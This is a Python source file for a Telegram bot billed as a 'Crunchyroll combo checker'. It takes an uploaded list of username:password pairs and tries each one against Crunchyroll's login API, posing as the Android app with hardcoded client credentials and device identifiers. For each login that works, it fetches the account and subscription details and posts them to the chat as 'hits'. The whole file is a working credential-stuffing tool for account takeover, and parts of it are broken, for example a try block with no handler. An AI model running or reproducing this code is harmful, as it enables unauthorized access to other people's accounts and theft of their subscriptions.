import requests
import time
import json
import random
import string
import urllib3
from telebot import types

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

hits = []
dead = []
cancel_check = False

def process_crunchytxt_command(bot, message):
    bot.send_message(message.chat.id, "Please send your txt file with combo data.")

def handle_crunchytxt_docs(bot, message):
    global process_running
    if process_running:
        bot.send_message(message.chat.id, "A process is already running. Please wait until it's finished.")
        return

    process_running = True
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        with open('combo_data.txt', 'wb') as new_file:
            new_file.write(downloaded_file)

        with open('combo_data.txt', 'r') as file:
            combo_list = file.readlines()

        total_combos = len(combo_list)
        start_time = time.time()

        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            types.InlineKeyboardButton(text="HIT ✅", callback_data='hit_crunchytxt'),
            types.InlineKeyboardButton(text="Dead ❌", callback_data='dead_crunchytxt'),
            types.InlineKeyboardButton(text="Cancel ❌", callback_data='cancel_crunchytxt')
        )

        initial_message = (
            f"↯ CRUNCHYROLL COMBO CHECKER\n\n"
            f"COMBO CHECKING:\n"
            f"• HIT ✅: [0] •\n"
            f"• Dead ❌: [0] •\n"
            f"• TOTAL: [{total_combos}] •\n"
            f"－－－－－－－－－－－－－－－－\n"
            f"⚫️ Total Combos - {total_combos}\n"
            f"⏱️ Time Taken - 0.00 seconds\n"
            f"▫️ Checked by: {message.from_user.username}\n"
            f"⚡️ Bot by - AFTAB 👑\n"
            f"－－－－－－－－－－－－－－－－"
        )

        msg = bot.send_message(message.chat.id, initial_message, reply_markup=keyboard)

        hits.clear()
        dead.clear()

        for combo in combo_list:
            if ':' in combo:
                user, pwd = combo.strip().split(':', 1)
                result = check_crunchytxt_combo(user, pwd)
                if "HIT" in result:
                    hits.append((combo.strip(), result))
                else:
                    dead.append((combo.strip(), result))

                new_message = (
                    f"↯ CRUNCHYROLL COMBO CHECKER\n\n"
                    f"COMBO CHECKING:\n{combo.strip()}\n\n"
                    f"• HIT ✅: [{len(hits)}] •\n"
                    f"• Dead ❌: [{len(dead)}] •\n"
                    f"• TOTAL: [{total_combos}] •\n"
                    f"－－－－－－－－－－－－－－－－\n"
                    f"⚫️ Total Combos - {total_combos}\n"
                    f"⏱️ Time Taken - {time.time() - start_time:.2f} seconds\n"
                    f"▫️ Checked by: {message.from_user.username}\n"
                    f"⚡️ Bot by - AFTAB 👑\n"
                    f"－－－－－－－－－－－－－－－－"
                )

                if new_message != current_message:
                    current_message = new_message
                    bot.edit_message_text(current_message, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)
            else:
                dead.append((combo.strip(), "Invalid format"))

        bot.edit_message_text(current_message, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)
        
def handle_crunchytxt_callback_query(call, bot):
    global cancel_check
    if call.data == 'hit_crunchytxt':
        send_combos(call.message.chat.id, hits, bot, "HIT ✅ Combos")
    elif call.data == 'dead_crunchytxt':
        send_combos(call.message.chat.id, dead, bot, "Dead ❌ Combos")
    elif call.data == 'cancel_crunchytxt':
        cancel_check = True
        bot.send_message(call.message.chat.id, "Process has been canceled.")

def send_combos(chat_id, combos, bot, title):
    if combos:
        combo_list = "\n".join([f"Combo: {combo}\nResult => {result}" for combo, result in combos])
        bot.send_message(chat_id, f"{title}\n\n{combo_list}")
    else:
        bot.send_message(chat_id, f"No {title} found.")

def check_crunchytxt_combo(user, pwd):
    login_url = "https://beta-api.crunchyroll.com/auth/v1/token"
    headers = {
        "Authorization": "Basic Z3N1ZnB0YjBmYW43dGFndG1ub3I6UUU1djBqc3Y5OVhNY2xadVNPX0Jfem1wOE03YlBfMnM=",
        "Connection": "Keep-Alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "ETP-Anonymous-Id": "b10da375-d759-47ce-aa9e-d666157c4325",
        "Host": "beta-api.crunchyroll.com",
        "User-Agent": "Crunchyroll/3.32.2 Android/7.1.2 okhttp/4.9.2"
    }
    data = {
        'username': user,
        'password': pwd,
        'grant_type': 'password',
        'scope': 'offline_access',
        'device_id': 'a6856484-cbcd-46f5-99b9-db8cff57ec17',
        'device_name': 'SM-G988N',
        'device_type': 'samsung SM-G9810'
    }

    response = requests.post(login_url, headers=headers, data=data)
    response_data = response.json()

    if 'access_token' in response_data:
        access_token = response_data['access_token']

        # Second request to get account information
        account_info_url = "https://beta-api.crunchyroll.com/accounts/v1/me"
        account_info_headers = {
            "Authorization": f"Bearer {access_token}",
            "Connection": "Keep-Alive",
            "Host": "beta-api.crunchyroll.com",
            "User-Agent": "Crunchyroll/3.32.2 Android/7.1.2 okhttp/4.9.2"
        }

        account_info_response = requests.get(account_info_url, headers=account_info_headers)
        account_info_data = account_info_response.json()

        email_verified = account_info_data.get('email_verified', 'N/A')
        account_creation_date = account_info_data.get('created', 'N/A')[:10]
        external_id = account_info_data.get('external_id', 'N/A')

        # Third request to get subscription information
        subscription_info_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products"
        subscription_info_headers = {
            "Authorization": f"Bearer {access_token}",
            "Connection": "Keep-Alive",
            "Host": "beta-api.crunchyroll.com",
            "User-Agent": "Crunchyroll/3.32.2 Android/7.1.2 okhttp/4.9.2"
        }

        subscription_info_response = requests.get(subscription_info_url, headers=subscription_info_headers)
        subscription_info_data = subscription_info_response.json()

        subscription_name = subscription_info_data.get('sku', 'Subscription Not Found')
        currency = subscription_info_data.get('currency_code', 'N/A')
        subscription_amount = subscription_info_data.get('amount', 'N/A')

        return (f"HIT SUCCESSFULLY✅\n"
                f"Email Verified: {email_verified}\n"
                f"Account Creation Date: {account_creation_date}\n"
                f"Subscription Name: {subscription_name}\n"
                f"Currency: {currency}\n"
                f"Subscription Amount: {subscription_amount}")
    else:
        return "Invalid Credentials🚫"

def random_string():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

def get_footer_info(total_combos, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⚫️ Total Combos - {total_combos}\n"
        f"⏱️ Time Taken - {elapsed_time:.2f} seconds\n"
        f"▫️ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB 👑\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
